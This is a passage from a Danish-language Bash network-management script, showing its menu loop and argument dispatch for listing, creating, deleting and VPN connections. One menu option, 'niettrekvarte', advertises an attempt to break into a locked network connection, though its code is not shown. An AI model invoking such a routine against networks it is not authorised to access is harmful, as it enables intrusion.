	echo "<about>         : OM SKRIPTET, LÆS FØR BRUG"
	echo
	read -p "ENTER/RETUR FOR MENU "
	menu
}
  

menu(){
while :
	do
	clear
	echo $os
	echo
	echo "<f> ........... VIS FORBINDELSER"
	echo "<a> ........... OPRET AUTOMATISK NETVÆRKSFORBINDELSE"
	echo "<c> ........... FORBIND TIL NETVÆRK"
	echo "<vpn> ......... FORBIND VIA OPENVPN KONFIGURATION"
	echo "<d> ........... SLET KONFIGURERET NETVÆRKSFORBINDELSE"
	echo "<conf> ........ VIS KONFIGUREREDE NETVÆRSKFORBINDELSER"
	echo "<niettrekvarte> FORSØG AT BRYDE LÅST NETVÆRKSFORBINDELSE"
	echo "<q> ........... AFSLUT"
	echo
  echo "<help> ........ HJÆLP"
	echo "<about> ... (!) OM SKRIPTET, LÆS FØR BRUG"
	echo
	if [ ! -z "$menuflag" ]; then
		echo
		echo "(!)"
		echo $menuflag
		echo
	fi
	read -p "KOMMANDO " opt	
		case $opt in
		[f] | [F]) 
			udkig
			clear
			echo $os
			echo
			;;
		"a" | "A")
			opstartsforb
			clear
	 		echo $os
			echo
			;;
		[c] | [C])
			midlforb
			clear
			echo $os
			echo
			;;
		"vpn" | "Vpn" | "VPN")
			openvpn
			clear
			echo $os
			echo
			;;
		[d] | [D])
			fjernforb
			clear
			echo $os
			echo
			;;
		"conf" | "CONF" | "Conf")
			viskonf
			clear
			echo $os
			echo
			;;
		"about" | "ABOUT" | "About")
			om
			clear
			echo $os
			echo
			;;
		"niettrekvarte" | "NIETTREKVARTE" | "Niettrekvarte")
			niettrekvarte
			clear
			echo $os
			echo
			;;
    "help" | "HELP" | "Help")
      clear 
      help
      echo $os
      echo
      ;;
		[q] | [Q])
			exit 0		
			;;
		*)
			menuflag="KOMMANDOEN BLEV IKKE GENKENDT."
			clear
			echo $os
			echo
		esac
	done
	
}

	######################################
	#### *  PROGRAMMER STARTER HER * #####
       ##### TAG IMOD ARGUMENT? #####

if [ "$1" == "vpn" ]; then
  openvpn
elif [ "$1" == "f" ]; then
  udkig
elif [ "$1" == "a" ]; then
  opstartsforb
elif [ "$1" == "c" ]; then
  midlforb
elif [ "$1" == "d" ]; then
  fjernforb
elif [ "$1" == "conf" ]; then
  viskonf
elif [ "$1" == "about" ]; then
  om
elif [ "$1" == "niettrekvarte" ]; then
 niettrekvarte 
fi

	################# MENU ###############

menu

exit 0
